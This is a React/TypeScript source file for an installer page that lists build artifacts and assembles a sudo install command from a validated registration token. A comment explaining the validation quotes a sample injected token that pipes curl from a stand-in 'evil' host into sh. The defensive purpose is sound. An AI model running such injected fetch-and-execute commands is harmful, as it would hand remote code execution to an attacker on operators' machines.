// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Jordan Ritz

/*
 * Installer & deploy hand-off page (Story #2937).
 *
 * Lists available installer artifacts from GET /api/v1/installer/artifacts
 * ({data:[...]} envelope — served by handleListInstallerArtifacts). Fixed
 * column set: Platform, Arch, Size, Checksum, Download.
 *
 * Scope mismatch between the two columns, labelled rather than hidden:
 * the rows are tenant-scoped (handleListInstallerArtifacts reads
 * ctxkeys.TenantID) but GET /api/v1/installer/download/{platform}/{arch} is
 * unauthenticated and always reads the fixed root tenant
 * (handlers_installer.go `downloadTenantID = "root"`, Issue #1704), returning a
 * tar.gz of the binary plus CA material — not the raw blob whose checksum the
 * row displays. Two consequences the operator must be told about before they
 * run the result under sudo: for a non-root tenant the link serves someone
 * else's package (or 404s), and the Checksum column can never match the
 * downloaded archive for any tenant. Both are surfaced in DOWNLOAD_SCOPE_NOTE
 * and in each cell's accessible name.
 *
 * Not gated on the principal instead: AuthContext keeps the principal in
 * memory only, so a page reload leaves `principal === null` while the session
 * is still valid — hiding the column on that signal would blank it for the
 * root operator after every refresh.
 *
 * Command-assembler form (below the table): platform/arch pickers + a
 * password-type token input (client-side only) + the controller origin
 * (window.location.origin) produce a copy-paste install one-liner mirroring
 * the readmeText helper in handlers_installer.go. The token value:
 *   - is never sent in any network request from this page
 *   - is never stored in localStorage or sessionStorage
 *   - is cleared when the component unmounts (navigation away)
 *   - is charset-validated against the base32 alphabet emitted by
 *     pkg/registration/generator.go before any command is assembled, and
 *     single-quoted in the POSIX command, so a pasted value can never
 *     contribute shell metacharacters to a sudo one-liner
 *
 * Security A9.1: all server-supplied values reach the DOM as JSX text nodes
 * only — never via dangerouslySetInnerHTML.
 */
import { useCallback, useEffect, useRef, useState } from 'react'
import { apiFetch } from '../api/client.ts'
import ErrorCard from '../shell/ErrorCard.tsx'

// ── Types ─────────────────────────────────────────────────────────────────────

interface ArtifactInfo {
  platform: string
  arch: string
  size: number
  checksum: string
  content_type: string
}

interface FetchOutcome {
  key: string
  artifacts?: ArtifactInfo[]
  error?: string
}

// ── Parse helpers (exported for testing) ──────────────────────────────────────

export function parseArtifact(value: unknown): ArtifactInfo | null {
  if (typeof value !== 'object' || value === null) return null
  const r = value as Record<string, unknown>
  const platform = typeof r.platform === 'string' ? r.platform : ''
  const arch = typeof r.arch === 'string' ? r.arch : ''
  if (!platform || !arch) return null
  return {
    platform,
    arch,
    size: typeof r.size === 'number' ? r.size : 0,
    checksum: typeof r.checksum === 'string' ? r.checksum : '',
    content_type: typeof r.content_type === 'string' ? r.content_type : '',
  }
}

export function parseArtifactList(data: unknown): ArtifactInfo[] {
  if (!Array.isArray(data)) throw new Error('unexpected response shape')
  const list: ArtifactInfo[] = []
  for (const item of data) {
    const artifact = parseArtifact(item)
    if (artifact !== null) list.push(artifact)
  }
  return list
}

// ── Format helpers (exported for testing) ──────────────────────────────────────

export function formatSize(bytes: number): string {
  if (bytes >= 1e9) return (bytes / 1e9).toFixed(1) + ' GB'
  if (bytes >= 1e6) return (bytes / 1e6).toFixed(1) + ' MB'
  if (bytes >= 1e3) return (bytes / 1e3).toFixed(1) + ' KB'
  return bytes + ' B'
}

// ── Command assembler helpers (exported for testing) ──────────────────────────

const PLATFORMS = ['darwin', 'linux', 'windows'] as const
const ARCHES = ['amd64', 'arm64'] as const

// Registration tokens are bare lowercase base32 (a-z, 2-7) with no padding —
// see pkg/registration/generator.go. Reject anything outside this charset so
// the assembled command can never carry shell metacharacters.
const TOKEN_RE = /^[a-z2-7]+$/

export function validateToken(token: string): boolean {
  return TOKEN_RE.test(token)
}

// Binary name mirrors installerFilename and the sudo prefix mirrors readmeText
// (both in handlers_installer.go). The subcommand and flag names come from
// buildInstallCommand in cmd/steward/main.go — `install --regtoken
// --controller-url`, not `--token`/`--controller`, which the packaged
// README.txt does not spell out.
//
// Every interpolated segment is validated here rather than relying on the caller:
// the output is presented to operators as a root (`sudo`) one-liner, so an
// unvalidated token such as `abcd; curl http://evil/x | sh` would turn this page
// into an RCE delivery vehicle vouched for by the controller UI. The function
// refuses to build a command it cannot vouch for instead of emitting a partially
// trusted string. The POSIX token is additionally single-quoted so the charset
// check is not the only thing standing between the operator and a shell.
export function assembleCommand(platform: string, arch: string, token: string): string {
  if (!(PLATFORMS as readonly string[]).includes(platform)) {
    throw new Error(`refusing to assemble command: unsupported platform ${JSON.stringify(platform)}`)
  }
  if (!(ARCHES as readonly string[]).includes(arch)) {
    throw new Error(`refusing to assemble command: unsupported arch ${JSON.stringify(arch)}`)
  }
  if (!validateToken(token)) {
    throw new Error('refusing to assemble command: registration token is not lowercase base32 (a-z, 2-7)')
  }
  const origin = window.location.origin
  if (platform === 'windows') {
    // Not quoted: single quotes are literal in cmd.exe (the exe would receive
    // them as part of the value) while PowerShell strips them. The charset check
    // above already excludes every cmd.exe and PowerShell metacharacter.
    return `.\\cfgms-steward-${arch}.exe install --regtoken ${token} --controller-url ${origin}`
  }
  return `sudo ./cfgms-steward-${arch} install --regtoken '${token}' --controller-url ${origin}`
}

// ── Sub-components ─────────────────────────────────────────────────────────────

function LoadingRows() {
  return (
    <div data-testid="installer-loading" aria-label="Loading installer artifacts">
      {Array.from({ length: 3 }, (_, i) => (
        <div className="skrow" key={i}>
          <span className="skel" style={{ width: '12%' }} />
          <span className="skel" style={{ width: '8%' }} />
          <span className="skel" style={{ width: '10%' }} />
          <span className="skel" style={{ width: '30%' }} />
          <span className="skel" style={{ width: '10%' }} />
        </div>
      ))}
    </div>
  )
}

function ArtifactEmpty() {
  return (
    <div className="notice empty" data-testid="installer-empty">
      <div className="ic">◍</div>
      <h3>No artifacts published yet</h3>
      <p>Installer artifacts for this tenant will appear here once uploaded.</p>
    </div>
  )
}

// Text of the scope/integrity disclosure rendered beneath the table. Kept as a
// module constant so the page and its tests share one source of truth.
export const DOWNLOAD_SCOPE_NOTE =
  'Download serves the root-published install package — a tar.gz of the steward ' +
  'binary plus CA material, published by the root tenant. It is not this tenant’s ' +
  'uploaded artifact, and the Checksum column above is the SHA-256 of the raw ' +
  'binary blob listed in this row, so it will not match the downloaded archive.'

function ArtifactTable({ artifacts }: { artifacts: ArtifactInfo[] }) {
  return (
    <>
      <table className="tbl" data-testid="artifact-table">
        <thead>
          <tr>
            <th>Platform</th>
            <th>Arch</th>
            <th>Size</th>
            <th>Checksum</th>
            <th>Download</th>
            <th className="c-spacer" aria-hidden="true" />
          </tr>
        </thead>
        <tbody>
          {artifacts.map((a) => {
            const downloadHref = `/api/v1/installer/download/${encodeURIComponent(a.platform)}/${encodeURIComponent(a.arch)}`
            const truncated = a.checksum.length > 16 ? a.checksum.slice(0, 16) + '…' : a.checksum
            return (
              <tr key={`${a.platform}-${a.arch}`} data-testid="artifact-row">
                <td><span className="nm">{a.platform}</span></td>
                <td><span className="mono2">{a.arch}</span></td>
                <td><span className="mut">{formatSize(a.size)}</span></td>
                <td>
                  <span
                    className="mono2"
                    title={a.checksum}
                    aria-label={`Checksum of the ${a.platform}/${a.arch} binary (not of the downloaded package): ${a.checksum}`}
                  >
                    {truncated}
                  </span>
                </td>
                <td>
                  <a
                    href={downloadHref}
                    title={`Root-published install package for ${a.platform}/${a.arch} (tar.gz)`}
                    aria-label={`Download the root-published install package for ${a.platform}/${a.arch}`}
                    data-testid={`download-${a.platform}-${a.arch}`}
                  >
                    Download
                  </a>
                </td>
                <td className="c-spacer" />
              </tr>
            )
          })}
        </tbody>
      </table>
      <p className="mut" data-testid="installer-download-note">
        {DOWNLOAD_SCOPE_NOTE}
      </p>
    </>
  )
}

function CommandAssembler() {
  const [platform, setPlatform] = useState('')
  const [arch, setArch] = useState('')
  const [token, setToken] = useState('')
  const [copied, setCopied] = useState(false)
  const copiedTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  useEffect(() => {
    return () => {
      // Clear the copy-confirmation timer on unmount. The token is component
      // state and disappears automatically when the page is navigated away from.
      if (copiedTimerRef.current !== null) clearTimeout(copiedTimerRef.current)
    }
  }, [])

  const tokenValid = token !== '' && validateToken(token)
  const tokenInvalid = token !== '' && !tokenValid
  // Mirrors assembleCommand's own preconditions so the render path can never
  // reach the throw — the function validates independently of this gate.
  const canAssemble =
    (PLATFORMS as readonly string[]).includes(platform) &&
    (ARCHES as readonly string[]).includes(arch) &&
    tokenValid
  const command = canAssemble ? assembleCommand(platform, arch, token) : ''

  function handleCopy() {
    if (!canAssemble) return
    void navigator.clipboard.writeText(command).then(() => {
      setCopied(true)
      if (copiedTimerRef.current !== null) clearTimeout(copiedTimerRef.current)
      copiedTimerRef.current = setTimeout(() => setCopied(false), 2000)
    })
  }

  return (
    <section className="panel" aria-labelledby="assembler-heading">
      <h2 id="assembler-heading">Assemble install command</h2>
      <p className="mut">
        Paste the registration token you minted with{' '}
        <span className="mono2">cfg</span> to assemble a copy-paste install
        command. The token is interpolated locally — it is never sent to the
        server from this page.
      </p>

      <div className="assembler-form">
        <label className="field-label">
          Platform
          <select
            className="wf-input"
            value={platform}
            onChange={(e) => setPlatform(e.target.value)}
            data-testid="assembler-platform"
          >
            <option value="">Select platform…</option>
            {PLATFORMS.map((p) => (
              <option key={p} value={p}>{p}</option>
            ))}
          </select>
        </label>

        <label className="field-label">
          Architecture
          <select
            className="wf-input"
            value={arch}
            onChange={(e) => setArch(e.target.value)}
            data-testid="assembler-arch"
          >
            <option value="">Select arch…</option>
            {ARCHES.map((a) => (
              <option key={a} value={a}>{a}</option>
            ))}
          </select>
        </label>

        <label className="field-label">
          Registration token
          <input
            type="password"
            className="wf-input"
            value={token}
            onChange={(e) => setToken(e.target.value)}
            placeholder="Paste registration token…"
            autoComplete="off"
            data-1p-ignore
            data-lpignore="true"
            data-testid="assembler-token"
          />
        </label>
        {tokenInvalid && (
          <span
            className="wf-form-error"
            role="alert"
            data-testid="assembler-token-error"
          >
            Token must contain only lowercase letters a–z and digits 2–7 (base32 format from{' '}
            <span className="mono2">cfg registration create-token</span>).
          </span>
        )}

        <div className="assembler-cmd-row">
          <label className="field-label" style={{ flex: 1 }}>
            Install command
            <input
              type="text"
              className="wf-input mono2"
              value={command}
              readOnly
              placeholder="Fill in platform, arch, and token above…"
              data-testid="assembler-command"
              aria-live="polite"
            />
          </label>
          <button
            type="button"
            className="wf-btn-sm"
            disabled={!canAssemble}
            onClick={handleCopy}
            data-testid="assembler-copy"
            style={{ alignSelf: 'flex-end' }}
          >
            {copied ? 'Copied' : 'Copy'}
          </button>
        </div>
      </div>
    </section>
  )
}

// ── Main page ─────────────────────────────────────────────────────────────────

export default function InstallerPage() {
  const [attempt, setAttempt] = useState(0)
  const [outcome, setOutcome] = useState<FetchOutcome | null>(null)

  const key = `installer:${attempt}`
  const retry = useCallback(() => setAttempt((n) => n + 1), [])

  useEffect(() => {
    let cancelled = false
    apiFetch('/api/v1/installer/artifacts')
      .then(async (response) => {
        if (!response.ok) {
          throw new Error(`GET /api/v1/installer/artifacts — ${response.status}`)
        }
        const body: unknown = await response.json()
        const artifacts = parseArtifactList(
          (body as Record<string, unknown> | null)?.data,
        )
        if (cancelled) return
        setOutcome({ key, artifacts })
      })
      .catch((cause: unknown) => {
        if (cancelled) return
        setOutcome({
          key,
          error:
            cause instanceof Error && cause.message
              ? cause.message
              : 'GET /api/v1/installer/artifacts — request failed',
        })
      })
    return () => {
      cancelled = true
    }
  }, [key, attempt])

  const current = outcome?.key === key ? outcome : null
  const loading = current === null
  const error = current?.error ?? null
  const artifacts = current?.artifacts ?? null

  return (
    <>
      <div className="htitle">
        <h1>Installer</h1>
        <p>Download installer artifacts and assemble a registration command for your platform.</p>
      </div>

      <div className="workspace">
        <section className="panel">
          {loading ? (
            <LoadingRows />
          ) : error !== null ? (
            <ErrorCard
              heading="Couldn't load installer artifacts"
              detail={error}
              onRetry={retry}
            />
          ) : artifacts !== null && artifacts.length === 0 ? (
            <ArtifactEmpty />
          ) : artifacts !== null ? (
            <ArtifactTable artifacts={artifacts} />
          ) : null}
        </section>

        <CommandAssembler />
      </div>
    </>
  )
}
